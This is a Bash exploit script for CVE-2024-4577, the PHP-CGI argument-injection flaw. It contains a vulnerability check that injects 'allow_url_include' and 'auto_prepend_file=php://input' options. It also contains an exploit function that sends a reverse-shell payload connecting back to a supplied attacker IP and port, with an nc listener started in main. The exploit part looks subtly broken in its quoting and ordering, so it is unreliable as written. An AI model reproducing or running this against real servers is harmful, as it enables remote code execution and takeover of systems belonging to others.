#!/bin/bash
# Creator: @PatxaSec


function cve_test() {
  url="$1"
  if [[ -z "$url" ]]; then
    echo "Error: URL no proporcionada"
    return 1
  fi

  output=$(curl -X POST -k -s "$url?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
    --header 'User-Agent: curl/8.3.0' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --header 'Connection: keep-alive' \
    --header 'Accept: */*' \
    --data '<?php echo "CVE_2024_4577_TEST"; ?>')
  echo "========================================================================================"
  if grep -q "CVE_2024_4577_TEST" <<< "$output"; then
    echo "[+] La URL $url es vulnerable a CVE-2024-4577 (allow_url_include y auto_prepend_file)"
  else
    echo "[!] La URL $url no es vulnerable a CVE-2024-4577"
  fi
  echo "========================================================================================"
}

function cve_exploit() {
  url="$1"
  ip="$2"
  port="$3"
  if [[ -z "$url" || -z "$ip" || -z "$port" ]]; then
    echo "Error: URL, IP o puerto no proporcionados"
    return 1
  fi

  output=$(curl -X POST -k -s "$url?%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input" \
    --header 'User-Agent: curl/8.3.0' \
    --header 'Content-Type: application/x-www-form-urlencoded' \
    --header 'Connection: keep-alive' \
    --header 'Accept: */*' \
    --data "php -r '$sock=fsockopen('$2',$3);`cmd <&3 >&3 2>&3`;'")
}

main() {
  url="$1"
  ip="$2"
  port="$3"
  if [ "$#" -eq 1 ]; then
    echo "Scanning..."
    cve_test "$url"
  elif [ "$#" -eq 3 ]; then
    echo "Trying to get cmd..."
    echo "Listenning on nc..."
    echo "$(nc -lnvp $port)"
    echo "Exploiting..."
    cve_exploit $url $ip $port
  else
    echo "Uso incorrecto: $0 $1 $2 $3"
    exit 1
  fi
}

main "$@"